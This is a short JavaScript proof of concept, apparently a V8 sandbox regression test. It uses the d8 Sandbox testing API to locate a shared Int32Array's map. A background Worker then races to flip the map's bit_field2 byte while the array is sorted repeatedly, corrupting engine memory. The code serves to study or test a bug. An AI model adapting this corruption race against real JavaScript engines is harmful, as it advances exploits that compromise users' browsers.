let sbx_memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
let len = 0x20000;
let ar = new Int32Array(new SharedArrayBuffer(Int32Array.BYTES_PER_ELEMENT * len));

function corruptInBackground(address, valueA, valueB) {
    function workerTemplate(address, valueA, valueB) {
        let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
        while (true) {
            memory.setUint8(address, valueA, true);
            memory.setUint8(address, valueB, true);
        }
    }
    const workerCode = new Function(
        `(${workerTemplate})(${address}, ${valueA}, ${valueB})`);
    return new Worker(workerCode, { type: 'function' });
}

print("Sandbox.base: 0x" + Sandbox.base.toString(16));
let ar_addr = Sandbox.getAddressOf(ar);
print("ar: 0x" + ar_addr.toString(16));
let ar_map = sbx_memory.getUint32(ar_addr, true);
print("ar map: 0x" + ar_map.toString(16));
let bit_field2_addr = ar_map + 10;
print("bit_field2_addr: 0x" + bit_field2_addr.toString(16));
let bit_field2_val = sbx_memory.getUint8(bit_field2_addr);
print("bit_field2_addr value: 0x" + bit_field2_val.toString(16));

let worker = corruptInBackground(bit_field2_addr, bit_field2_val, bit_field2_val ^ 0xff);

for (let i = 0; i < 100; i++) {
    ar.sort();
}

worker.terminate();
